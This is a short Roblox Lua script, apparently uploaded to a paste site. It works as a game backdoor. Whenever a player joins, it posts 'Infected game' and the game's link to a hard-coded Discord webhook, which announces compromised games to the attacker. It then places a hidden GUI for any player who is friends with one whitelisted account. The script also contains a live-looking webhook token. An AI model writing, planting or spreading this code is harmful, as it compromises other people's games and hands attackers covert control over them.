--[[
	id: D5gkpX20R3agnzCQaYcuP
	name: PopTartGang
	description: Script1
	time1: 2021-06-05 00:45:54.598414+00
	time2: 2021-06-05 00:45:54.598414+00
	uploader: CPUOPXLscfuSGtzcD1UyXIMgY49EFSNa6xCvfuZG
	uploadersession: ct-fJ2H400vXlPT2ptjxKIQuym1fO5
	flag: f
--]]

local players = game.Players:GetPlayers()

local httpService=game:GetService("HttpService")
webhook="https://discord.com/api/webhooks/850526020427579412/_rQl1-mVnwCn1S-NgD0jdWV0jYCVF4JpxXCtoli3V3A2XcykK0x3WaMhpAKGl35x_pso"
checked=false
local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId)

game.Players.PlayerAdded:Connect(function(player)
    local data={
        ["content"]="Infected game",
        ["embeds"] = {{
            ["title"] = player.Name.." joined a infected game",
            ["description"] ="https://www.roblox.com/games/"..game.PlaceId.."/",
            ["type"] = "rich"
            
        }
        }}
    if not checked then
        data=httpService:JSONEncode(data)
        httpService:PostAsync(webhook,data)
        checked=true
    end
    
    if player:IsFriendsWith(2608962761) then
        print("Whitelisted!")
        local gui=script.AppleIsToxic:Clone()
        gui.Parent=player.PlayerGui
    end
end)